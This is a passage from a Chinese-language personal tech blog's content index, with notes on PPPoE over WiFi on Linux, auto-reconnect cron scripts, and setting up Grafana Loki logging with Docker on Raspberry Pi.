Ethernet，不是PPP over WiFi</code><br>感覺還滿有道理的<br>不過還是有看到留言說可以使用<br>今天要來破解是不是真的…</p>\n<a id=\"more\"></a>\n<p>好啦，突然想到家裡有一台 surface<br>直接連 wifi 做 pppoe 連線就可以馬上知道結果<br>結果<strong>可以</strong><br>但是不知道 Linux 能不能用?</p>\n<p>簡單記錄一下怎麼使用</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安裝pppoeconf</span></span><br><span class=\"line\">sudo apt-get install pppoeconf</span><br><span class=\"line\"><span class=\"comment\"># 設定</span></span><br><span class=\"line\">sudo pppoeconf</span><br></pre></td></tr></table></figure>\n<p>設定可以參考<a href=\"http://thinker-evans.blogspot.com/2015/04/raspberry-pi-adsl-pppoe.html\" target=\"_blank\" rel=\"noopener\">沉思的伊文: Raspberry Pi 樹莓派 ADSL PPPoE 連線到網際網路</a><br>‘noauth’跟’defaultroute’這個選 yes</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">向配置文件添加 『noauth&apos; 和 『defaultroute&apos;</span><br><span class=\"line\">noauth 不認證遠端身份，家庭寬帶默認 Yes 即可</span><br><span class=\"line\">defaultroute 添加默認路由，不手動改路由表或者特殊需求默認 Yes 即可</span><br><span class=\"line\">參考[【家庭服务器计划】pppoeconf | Debian 配置 PPPOE 上网 – Lensual‘s Space](https://lensual.space/brain-hole/846.html)</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://blog.csdn.net/moreorless/article/details/5397427\" target=\"_blank\" rel=\"noopener\">linux 添加静态路由 - leon - CSDN 博客</a><br>MTU 選項也選 yes<br>詳細:<a href=\"http://tc.wangchao.net.cn/bbs/detail_1450004.html\" target=\"_blank\" rel=\"noopener\">小議 TCP 的 MSS(最大分段)以及 MTU - 王朝網路 - wangchao.net.cn</a><br><a href=\"https://lensual.space/brain-hole/846.html\" target=\"_blank\" rel=\"noopener\">【家庭服务器计划】pppoeconf | Debian 配置 PPPOE 上网 – Lensual‘s Space</a><br>裡面都詳細提到</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">MTU 最大傳輸單元，二層幀的淨荷</span><br><span class=\"line\">MSS 最大報文長度，TCP 協議特性，TCP 協議的淨荷，用於協商適應路徑中的 MTU</span><br><span class=\"line\">Ethernet 的 MTU 為 1500 (Byte) ，超過 1500 的載荷 ( payload ) 將被分段，最大幀長度為 Eth Header(14) + Payload(1500) + FCS(4) = 1518 (Byte)。其實 FCS 用 wireshark 抓包看不到的，用於校驗已經被系統底層剔除。另外以太網規範還有前導碼和幀間隔，那些是用來底層收發控制相關的（誤</span><br><span class=\"line\">PPP 的 MTU 同為 1500，最大幀長度為 PPP Header(5) + Payload(1500) + FCS(2) + Flag(1) = 1508 (Byte)。</span><br><span class=\"line\">要把 PPP 塞進 Ethernet 就是 PPPOE，需要把 PPP 的 MTU 縮減才可以使得 PPP 滿足 Ethernet 的 MTU。</span><br><span class=\"line\">原來的 PPP 最大會出現 1508 的幀，現在需要控制在 1500 以內。PPP 的 MTU 就是 1500 – (1508 – 1500) = 1492。</span><br><span class=\"line\">所以 PPPOE 的 MTU 通常為 1492 (Byte) ，以便在 MTU 為 1500 的 Ethernet 上運行。</span><br><span class=\"line\">MSS 箝制(Clamping) 會修改 TCP SYN 的 MSS 以符合當前的 MTU。因為置於路由器後面的主機使用的是 MTU 為 1500 的 Ethernet 。雖然 ICMP 協議可以在傳輸過程中修正 TCP 的 MSS ，但是部分運營商和設備考慮到安全問題或者就是不想讓你 ping 和 tracertoute 免得投訴他們禁止了 ICMP 協議。</span><br></pre></td></tr></table></figure>\n<p>基本上設定都是 yes</p>\n<p>連線</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 連線dsl-provider設定檔</span></span><br><span class=\"line\">pon dsl-provider</span><br><span class=\"line\"><span class=\"comment\"># 斷線pppoe</span></span><br><span class=\"line\">poff dsl-provider</span><br><span class=\"line\"><span class=\"comment\"># 查詢狀態</span></span><br><span class=\"line\">plog</span><br><span class=\"line\">ifconfig</span><br><span class=\"line\"><span class=\"comment\"># 關閉全部pppoe</span></span><br><span class=\"line\">poff -a</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">PPPOE設定檔</span><br><span class=\"line\">    /etc/ppp/peers/dsl-provider</span><br><span class=\"line\">    dsl-provider內紀錄ADSL連線相關參數（含帳號），可以修改成hinet以利識別，但改檔名後，pppoe_on_boot檔內的開機自動撥接的設定檔名稱也要跟著換，否則開機自動撥接功能會失效。</span><br><span class=\"line\">    /etc/ppp/pppoe_on_boot</span><br><span class=\"line\">    設定系統開機時自動撥接之設定檔，其中「exec pppd call dsl-provider」就是執行撥接時呼叫的設定檔</span><br></pre></td></tr></table></figure>\n<p>重新連線 script<a href=\"https://blog.longwin.com.tw/2007/08/adsl_repppoe_script_2007/\" target=\"_blank\" rel=\"noopener\">Debian Linux: ADSL PPPoE 自動重撥 Script | Tsung’s Blog</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">重新撥接的程式 及 設定步驟</span><br><span class=\"line\"></span><br><span class=\"line\">重新撥接的程式如下: (vim /usr/bin/repppoe)</span><br><span class=\"line\"></span><br><span class=\"line\">    #!/bin/bash</span><br><span class=\"line\">    #if !ping -c 3 168.95.1.1 &gt; /dev/null 2&gt;&amp;1</span><br><span class=\"line\">    #if !(cat /proc/net/dev | grep ppp0) &gt; /dev/null 2&gt;&amp;1</span><br><span class=\"line\">    #if !(cat /proc/net/dev | grep ppp) &gt; /dev/null 2&gt;&amp;1</span><br><span class=\"line\">    if !ping -c 3 tw.yahoo.com &gt; /dev/null 2&gt;&amp;1</span><br><span class=\"line\">    then</span><br><span class=\"line\">    #/usr/bin/poff</span><br><span class=\"line\">    #/usr/bin/pon dsl-provider</span><br><span class=\"line\">    /usr/bin/pon</span><br><span class=\"line\">    fi</span><br><span class=\"line\"></span><br><span class=\"line\">chmod +x /usr/bin/repppoe</span><br><span class=\"line\">設定 crontab (設 root 的 crontab)</span><br><span class=\"line\"></span><br><span class=\"line\">    crontab -e # 之後寫入下述</span><br><span class=\"line\">    */5 * * * * /usr/bin/repppoe</span><br></pre></td></tr></table></figure>\n<p>進入就到這邊，以後要用可以翻翻這篇。</p>\n<p>小記…，發現 pon 可以一直新增 pppoe 連線<br>但好像最後面新增會做 default route<br>所以只會有一個 ip 才會連到<br>我一直以為都可以連…<br>但還是要小心，我記得 hinet 只能撥接 8 個<br><a href=\"http://service.hinet.net/2004/adslstaticip_faq.htm\" target=\"_blank\" rel=\"noopener\">HiNet 客戶服務 &gt; 問題搜尋 &gt; 上網問題</a></p>\n<p>參考來源:</p>\n<ul>\n<li><a href=\"http://thinker-evans.blogspot.com/2015/04/raspberry-pi-adsl-pppoe.html\" target=\"_blank\" rel=\"noopener\">沉思的伊文: Raspberry Pi 樹莓派 ADSL PPPoE 連線到網際網路</a></li>\n<li><a href=\"https://vvl.me/2017/09/30/Linux-PPPoE/\" target=\"_blank\" rel=\"noopener\">在 Linux 上拨号上网(PPPoE) | 光阴的故事</a></li>\n<li><a href=\"http://blog.kevinlinul.idv.tw/?p=174\" target=\"_blank\" rel=\"noopener\">在 CentOS 7 設定 PPPoE 撥接功能 | Kevin Linul 網路日記本</a></li>\n<li><a href=\"http://linux.vbird.org/linux_server/0130internet_connect.php#connect_adsl\" target=\"_blank\" rel=\"noopener\">鳥哥的 Linux 私房菜 – 連上 Internet 的方法與步驟</a></li>\n<li><a href=\"http://note.drx.tw/2008/08/networkpppoe-adsl.html\" target=\"_blank\" rel=\"noopener\">Ubuntu 網路設定 - PPPoE (ADSL) 指令 | 凍仁的筆記</a></li>\n<li><a href=\"https://lensual.space/brain-hole/846.html\" target=\"_blank\" rel=\"noopener\">【家庭服务器计划】pppoeconf | Debian 配置 PPPOE 上网 – Lensual‘s Space</a></li>\n<li><a href=\"http://joe01032002.pixnet.net/blog/post/92428377-%E3%80%90linux%E3%80%91pppoe%E7%B6%B2%E8%B7%AF%E6%92%A5%E6%8E%A5%E8%A8%AD%E5%AE%9A\" target=\"_blank\" rel=\"noopener\">【Linux】pppoe 網路撥接設定 @ 等待 :: 痞客邦 ::</a></li>\n<li><a href=\"https://gavaee.wordpress.com/2011/10/21/%E8%A8%AD%E5%AE%9Aadsl%EF%BC%88pppoe%EF%BC%89%E9%80%A3%E7%B7%9A/\" target=\"_blank\" rel=\"noopener\">設定 ADSL（PPPOE）連線 | Gavaee’s Blog</a></li>\n<li><a href=\"https://blog.longwin.com.tw/2007/08/adsl_repppoe_script_2007/\" target=\"_blank\" rel=\"noopener\">Debian Linux: ADSL PPPoE 自動重撥 Script | Tsung’s Blog</a></li>\n</ul>\n","categories":["Linux"],"tags":["pppoe","network"]},{"title":"Linux在Wifi使用pppoe連線後，重開機不能連線上網","url":"/blog/2019/01/27/Linux%E5%9C%A8Wifi%E4%BD%BF%E7%94%A8pppoe%E9%80%A3%E7%B7%9A%E5%BE%8C%EF%BC%8C%E9%87%8D%E9%96%8B%E6%A9%9F%E4%B8%8D%E8%83%BD%E9%80%A3%E7%B7%9A%E4%B8%8A%E7%B6%B2/","content":"<p>在使用<a href=\"https://malagege.github.io/blog/2019/01/26/Linux%E4%BD%BF%E7%94%A8pppoe%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/\">Linux 使用 pppoe 連線方法小記 | 程式狂想筆記</a>後<br>重開機發現不能上網<br>我還以為是 wifi 壞掉<br>好在最後查到原因<br>在此筆記</p>\n<a id=\"more\"></a>\n<p>首先，我在<code>sudo vim /etc/network/interfaces</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># interfaces(5) file used by ifup(8) and ifdown(8)</span><br><span class=\"line\">auto lo</span><br><span class=\"line\">iface lo inet loopback</span><br><span class=\"line\"></span><br><span class=\"line\">iface dsl-provider inet ppp</span><br><span class=\"line\">pre-up /bin/ip link set wlp3s0 up # line maintained by pppoeconf</span><br><span class=\"line\">provider dsl-provider</span><br><span class=\"line\"></span><br><span class=\"line\">auto wlp3s0</span><br><span class=\"line\">iface wlp3s0 inet manual</span><br></pre></td></tr></table></figure>\n<p>在意開始之前，只有這兩段</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">auto lo</span><br><span class=\"line\">iface lo inet loopback</span><br></pre></td></tr></table></figure>\n<p><del>不過，重開機才能確定網路才能設定到</del><br>後來網路上找到<code>sudo service networking restart</code><br>不過我在 ElementaryOS 上沒有什麼效果<br>後來</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo service network-manager restart</span><br></pre></td></tr></table></figure>\n<p>發現桌面右上角圖示有重新載入<br>可正常載入網路狀況</p>\n<p>最後發現是<code>iface wlp3s0 inet manual</code>這段影響的<br>不過我還是保留一開始的那兩行<br>註解掉後還是能用 pppoe 連線</p>\n<p>網路設定我就不深入研究了，相關 Linux 設定方法如下</p>\n<ul>\n<li><a href=\"https://blog.longwin.com.tw/2011/02/linux-network-set-example-2011/\" target=\"_blank\" rel=\"noopener\">Debian / Ubuntu Linux 網路設定範例 | Tsung’s Blog</a></li>\n<li><a href=\"https://blog.csdn.net/u011077672/article/details/71123319\" target=\"_blank\" rel=\"noopener\">Linux 网络接口配置（/etc/network/interfaces） - 邱凯翔 Edward 的个人博客 - CSDN 博客</a></li>\n<li><a href=\"https://www.debian.org/doc/manuals/debian-reference/ch05.zh-tw.html\" target=\"_blank\" rel=\"noopener\">第 5 章 網絡設置</a></li>\n<li><a href=\"http://yehnan.blogspot.com/2016/05/raspberry-piipdhcpcd.html\" target=\"_blank\" rel=\"noopener\">葉難: Raspberry Pi：固定私有 IP 與 dhcpcd</a></li>\n<li><a href=\"https://blog.csdn.net/yjbaobo/article/details/75146840\" target=\"_blank\" rel=\"noopener\">树莓派 3 设置静态 ip dhcpcd vs /etc/network/interfaces - yjbaobo 的博客 - CSDN 博客</a></li>\n</ul>\n<p><strong>重新檢查連線</strong></p>\n<p><a href=\"http://yhhuang1966.blogspot.com/2018/01/blog-post.html\" target=\"_blank\" rel=\"noopener\">小狐狸事務所: 樹莓派自動偵測網路斷線時重開機的方法</a><br><a href=\"https://weworkweplay.com/play/rebooting-the-raspberry-pi-when-it-loses-wireless-connection-wifi/\" target=\"_blank\" rel=\"noopener\">Rebooting the Raspberry Pi when it loses wireless connection | We Work We Play</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ping -c4 192.168.1.1 &gt; /dev/null</span><br><span class=\"line\"> </span><br><span class=\"line\">if [ $? != 0 ] </span><br><span class=\"line\">then</span><br><span class=\"line\">  sudo /sbin/shutdown -r now</span><br><span class=\"line\">fi</span><br></pre></td></tr></table></figure>\n<p><em>/5 </em> <em> </em> * /usr/bin/sudo -H /usr/local/bin/checkwifi.sh &gt;&gt; /dev/null 2&gt;&amp;1</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ping -c4 192.168.1.1 &gt; /dev/null</span><br><span class=\"line\"> </span><br><span class=\"line\">if [ $? != 0 ] </span><br><span class=\"line\">then</span><br><span class=\"line\">  echo &quot;No network connection, restarting wlan0&quot;</span><br><span class=\"line\">  /sbin/ifdown &apos;wlan0&apos;</span><br><span class=\"line\">  sleep 5</span><br><span class=\"line\">  /sbin/ifup --force &apos;wlan0&apos;</span><br><span class=\"line\">fi</span><br></pre></td></tr></table></figure>\n<p><strong>2.為了要使raspberry pi  不要進入省電或自動將無線網路關掉</strong><br>參考:<a href=\"http://learn-infotech-blog.blogspot.com/2015/04/raspberry-pi-2-modelb.html\" target=\"_blank\" rel=\"noopener\">IT學習日誌: [Raspberry Pi 2 ModelB] 無線網路常常斷線解決方法</a><br>在/etc/network/interfaces<br>加上一行<br>wireless-power off<br> 外</p>\n<p>修改   /etc/kbd/config<br>將 BLANK_TIME= 改為 BLANK_TIME=0<br>和 POWERDOWN_TIME=  改為  POWERDOWN_TIME=0 </p>\n","categories":["Linux"],"tags":["linux","wifi"]},{"title":"Loki 初體驗教學(在Raspberry 啟用 Docker-Loki-Driver)","url":"/blog/2021/04/18/Loki-%E5%88%9D%E9%AB%94%E9%A9%97%E6%95%99%E5%AD%B8/","content":"<p>最近在三台樹梅派使用 Docker 架設服務<br>但是查看 log 真的不是很方便<br>最近剛完 Prometheus 看到 Loki<br>跟 Prometheus 很像，又是跟 Container 很有關係<br>看了一下佈署流程，並不是非常難<br>所以就食做看看</p>\n<a id=\"more\"></a>\n<p>使用官方 docker-compose <a href=\"https://github.com/grafana/loki/blob/master/production/docker-compose.yaml\" target=\"_blank\" rel=\"noopener\">loki/docker-compose.yaml at master · grafana/loki · GitHub</a><br>grafana 帳號密碼為 admin/admin<br>進去新加 datasource 為 loki<br>這樣就算部屬完成</p>\n<p>Grafana 要點選 <code>expore</code> 才能看到日誌</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">\"3\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">networks:</span></span><br><span class=\"line\"><span class=\"attr\">  loki:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\"><span class=\"attr\">  loki:</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">grafana/loki:2.0.0</span></span><br><span class=\"line\"><span class=\"attr\">    ports:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"3100:3100\"</span></span><br><span class=\"line\"><span class=\"attr\">    command:</span> <span class=\"bullet\">-config.file=/etc/loki/local-config.yaml</span></span><br><span class=\"line\"><span class=\"attr\">    networks:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">loki</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">  promtail:</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">grafana/promtail:2.0.0</span></span><br><span class=\"line\"><span class=\"attr\">    volumes:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">/var/log:/var/log</span></span><br><span class=\"line\"><span class=\"attr\">    command:</span> <span class=\"bullet\">-config.file=/etc/promtail/config.yml</span></span><br><span class=\"line\"><span class=\"attr\">    networks:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">loki</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">  grafana:</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">grafana/grafana:latest</span></span><br><span class=\"line\"><span class=\"attr\">    ports:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">\"3000:3000\"</span></span><br><span class=\"line\"><span class=\"attr\">    networks:</span></span><br><span class=\"line\"><span class=\"bullet\">      -</span> <span class=\"string\">loki</span></span><br></pre></td></tr></table></figure>\n<p>本機是linux 的話， /var/log/底下都會傳到 loki 日誌去<br>可以用 volume 把日誌掛到 containr 那邊去<br>應該也有一樣的效果<br>不過我下面還有比較好的方法</p>\n<p>加 loki datasource 和 explore操作<br><a href=\"https://blog.csdn.net/Kammingo/article/details/115489954\" target=\"_blank\" rel=\"noopener\">Loki轻量级日志系统_Kammingo的博客-CSDN博客</a></p>\n<p><a href=\"https://www.mdeditor.tw/pl/pKL4/zh-tw\" target=\"_blank\" rel=\"noopener\">輕量級日誌系統Loki原理簡介和使用_平凡人筆記 - MdEditor</a></p>\n<ul>\n<li><a href=\"https://blog.kelu.org/tech/2020/01/31/grafana-loki-for-logging-aggregation.html\" target=\"_blank\" rel=\"noopener\">使用 Loki 搭建个人日志平台 | 血衫非弧の一存</a></li>\n</ul>\n<h2 id=\"docker-實作-Loki-日誌\"><a href=\"#docker-實作-Loki-日誌\" class=\"headerlink\" title=\"docker 實作 Loki 日誌\"></a>docker 實作 Loki 日誌</h2><p>再 container 把日誌輸出來不是很方便<br>所以我們是使用 docker 直接輸出日誌<br>可算非常方便</p>\n<p>參考來源:<br><a href=\"https://blog.csdn.net/u014756339/article/details/111992382\" target=\"_blank\" rel=\"noopener\">loki收集docker容器里运行服务的日志,loki+grafana_十个菜-CSDN博客</a></p>\n<p><a href=\"http://www.dlwxz.com/2020/07/docker-swarm%E7%BB%93%E5%90%88loki%E6%90%AD%E5%BB%BA%E8%BD%BB%E9%87%8F%E7%BA%A7%E6%97%A5%E5%BF%97%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/\" target=\"_blank\" rel=\"noopener\">docker swarm结合loki搭建轻量级日志监控系统 - 琴弦上的尼古丁</a></p>\n<h3 id=\"安裝-docker-loki-driver\"><a href=\"#安裝-docker-loki-driver\" class=\"headerlink\" title=\"安裝 docker loki driver\"></a>安裝 docker loki driver</h3><p><a href=\"https://grafana.com/docs/loki/latest/clients/docker-driver/\" target=\"_blank\" rel=\"noopener\">Docker driver | Grafana Labs</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker plugin install grafana/loki-docker-driver:latest --<span class=\"built_in\">alias</span> loki --grant-all-permissions </span><br><span class=\"line\"><span class=\"comment\"># 完成可用這個指令</span></span><br><span class=\"line\">docker plugin ls</span><br></pre></td></tr></table></figure>\n<p>相關升級、移除可以在官網看到</p>\n<p>其他<br><a href=\"https://www.huaweicloud.com/articles/f114e0a2a885a4ef8591dd11ff3590c7.html\" target=\"_blank\" rel=\"noopener\">Loki | 数据过期自动删除策略设计 - 华为云</a></p>\n<p>比較有趣看到yaml 模板寫法</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">\"3.4\"</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"attr\">x-logging:</span></span><br><span class=\"line\">  <span class=\"string\">&amp;loki-logging</span></span><br><span class=\"line\"><span class=\"attr\">  driver:</span> <span class=\"string\">loki</span></span><br><span class=\"line\"><span class=\"attr\">  options:</span></span><br><span class=\"line\"><span class=\"attr\">    loki-url:</span> <span class=\"string\">\"http://YOUR_IP:3100/loki/api/v1/push\"</span></span><br><span class=\"line\"><span class=\"attr\">    max-size:</span> <span class=\"string\">\"50m\"</span></span><br><span class=\"line\"><span class=\"attr\">    max-file:</span> <span class=\"string\">\"10\"</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\"><span class=\"attr\">  host:</span></span><br><span class=\"line\"><span class=\"attr\">    container_name:</span> <span class=\"string\">grafana</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">grafana/grafana</span></span><br><span class=\"line\"><span class=\"attr\">    environment:</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">TZ=Asia/Shanghai</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">LANG=zh_CN.UTF-8</span></span><br><span class=\"line\"><span class=\"attr\">    logging:</span> <span class=\"string\">*loki-logging</span></span><br><span class=\"line\"><span class=\"comment\"># ————————————————</span></span><br><span class=\"line\"><span class=\"comment\"># 版权声明：本文为CSDN博主「2018_like菜」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。</span></span><br><span class=\"line\"><span class=\"comment\"># 原文链接：https://blog.csdn.net/u014756339/article/details/111992382</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"樹梅派安裝法\"><a href=\"#樹梅派安裝法\" class=\"headerlink\" title=\"樹梅派安裝法\"></a>樹梅派安裝法</h2><p>參考:<a href=\"https://github.com/grafana/loki/issues/974#issuecomment-766390258\" target=\"_blank\" rel=\"noopener\">docker plugin enable Loki gives an error · Issue #974 · grafana/loki · GitHub</a></p>\n<ol>\n<li>嚐試安裝</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker plugin install grafana/loki-docker-driver:latest --alias loki --grant-all-permissions</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>看到錯誤</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Error response from daemon: dial unix /run/docker/plugins/61d4906b35d0d106db69561446160ba63bddb5f9a30d765293ddc75d11a6935b/loki.sock: connect: no such file or directory</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>git clone loki</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">git clone --depth=1 https://github.com/grafana/loki.git</span><br></pre></td></tr></table></figure>\n<ol start=\"4\">\n<li>在 loki 資料夾輸入</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安裝 golang</span></span><br><span class=\"line\">sudo apt install golang</span><br><span class=\"line\"><span class=\"comment\"># 編譯</span></span><br><span class=\"line\">GOOS=linux GOARCH=arm GOARM=7 go build ./cmd/docker-driver</span><br></pre></td></tr></table></figure>\n<p>樹莓派 build 一直失敗，後來發想到 Golang 也是跨平台<br>所以我在x86主機編譯順利。</p>\n<ol start=\"5\">\n<li>編譯檔案(docker-driver)複製到/var/lib/docker/plugins/&lt;ALPHA_NUMERIC_FOLDER&gt;/rootfs/bin</li>\n</ol>\n<p>把編譯好的 docker-driver，</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo ls /var/lib/docker/plugins/</span><br><span class=\"line\"><span class=\"comment\"># 有一個很長編碼資料夾就是</span></span><br></pre></td></tr></table></figure>\n<ol start=\"6\">\n<li>啟動 docker plugin </li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker plugin <span class=\"built_in\">enable</span> loki</span><br></pre></td></tr></table></figure>\n<p>這邊之前啟動的 docker containr 要刪掉重新起新的 container 才會有用</p>\n<h3 id=\"全局設定\"><a href=\"#全局設定\" class=\"headerlink\" title=\"全局設定\"></a>全局設定</h3><p>編輯daemon.json。linux下默認路徑是/etc/docker/daemon.json (需要sudo)， windows則默認是%userprofile%.docker\\daemon.json</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"log-driver\"</span>: <span class=\"string\">\"loki\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"log-opts\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"loki-url\"</span>: <span class=\"string\">\"http://YOUR_IP:3100/loki/api/v1/push\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"max-size\"</span>: <span class=\"string\">\"50m\"</span>,</span><br><span class=\"line\">    <span class=\"attr\">\"max-file\"</span>: <span class=\"string\">\"10\"</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"attr\">\"registry-mirrors\"</span>: [<span class=\"string\">\"https://registry.docker-cn.com\"</span>]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>參考:<a href=\"https://blog.csdn.net/u014756339/article/details/111992382\" target=\"_blank\" rel=\"noopener\">loki收集docker容器裡運行服務的日誌,loki+grafana_十個菜-CSDN博客</a></p>\n<h3 id=\"各自設定\"><a href=\"#各自設定\" class=\"headerlink\" title=\"各自設定\"></a>各自設定</h3><p>在 docker-compose 裡面加 logging</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">\"3.7\"</span></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\"><span class=\"attr\">  logger:</span></span><br><span class=\"line\"><span class=\"attr\">    image:</span> <span class=\"string\">grafana/grafana</span></span><br><span class=\"line\"><span class=\"attr\">    logging:</span></span><br><span class=\"line\"><span class=\"attr\">      driver:</span> <span class=\"string\">loki</span></span><br><span class=\"line\"><span class=\"attr\">      options:</span></span><br><span class=\"line\"><span class=\"attr\">        loki-url:</span> <span class=\"string\">\"http://localhost:3100/loki/api/v1/push\"</span></span><br></pre></td></tr></table></figure>\n<p>就可以完成</p>\n<p>指令可以用</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run --rm --name=grafana --<span class=\"built_in\">log</span>-driver=loki --<span class=\"built_in\">log</span>-opt loki-url=<span class=\"string\">\"http://YOUR_IP:3100/loki/api/v1/push\"</span> --<span class=\"built_in\">log</span>-opt max-size=50m --<span class=\"built_in\">log</span>-opt max-file=10 grafana/grafana</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># --log-driver=loki指定日志驱动器为loki</span></span><br><span class=\"line\"><span class=\"comment\"># --log-opt loki-url则指定了loki的url</span></span><br><span class=\"line\"><span class=\"comment\"># --log-opt max-size日志最大大小</span></span><br><span class=\"line\"><span class=\"comment\"># --log-opt max-file日志文件最大数量</span></span><br></pre></td></tr></table></figure>\n<p>參考:* <a href=\"https://blog.csdn.net/u014756339/article/details/111992382\" target=\"_blank\" rel=\"noopener\">loki收集docker容器里运行服务的日志,loki+grafana_十个菜-CSDN博客</a></p>\n<h2 id=\"使用-Loki-做-Traefik-Acess-Log-分析\"><a href=\"#使用-Loki-做-Traefik-Acess-Log-分析\" class=\"headerlink\" title=\"使用 Loki 做 Traefik Acess Log 分析\"></a>使用 Loki 做 Traefik Acess Log 分析</h2><p>loki 架好後，相關 docker log 設定完<br>Grafana 設定好 loki 資源<br>這邊記得把 traefik access log 改成 json</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#traefik</span></span><br><span class=\"line\"><span class=\"bullet\">    -</span> <span class=\"string\">\"--accesslog.format=json\"</span></span><br></pre></td></tr></table></figure>\n<p>import 這個 dashboard <a href=\"https://grafana.com/grafana/dashboards/13713\" target=\"_blank\" rel=\"noopener\">Traefik Via Loki dashboard for Grafana | Grafana Labs</a></p>\n<p>還要把 json 內容裡面 label 改掉</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;job=\\&quot;/var/log/traefik.log\\&quot;&#125;</span><br></pre></td></tr></table></figure>\n<p>換成(這邊換成你電腦相對位置)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;container_name=\\&quot;rpi-traefik_traefik_1\\&quot;,host=\\&quot;PI202\\&quot;&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.jianshu.com/p/68955d911fa4\" target=\"_blank\" rel=\"noopener\">Traefik 2 监控系统之Grafana Prometheus Promtail Loki完美结合 - 简书</a><br>詳細也可以看這篇，也寫得很完整</p>\n<p>也有看到非常強的 dashboard<br><a href=\"https://grafana.com/grafana/dashboards/12559\" target=\"_blank\" rel=\"noopener\">Loki v2 Web Analytics Dashboard for NGINX dashboard for Grafana | Grafana Labs</a></p>\n","categories":["Loki"],"tags":["docker","loki","traefik","log","grafana"]},{"title":"MYSQL 時間運算 筆記","url":"/blog/2018/05/31/MYSQL-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98/","content":"<p>平常用到時間運算，假如能在SQL撈到想要的資料<br>這樣程式可以寫得少，速度也跟者快…<br>但是偏偏MySQL時間運算不太熟<br>在此網路找一些，寫筆記….</p>\n<a id=\"more\"></a>\n<p><a href=\"https://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html\" 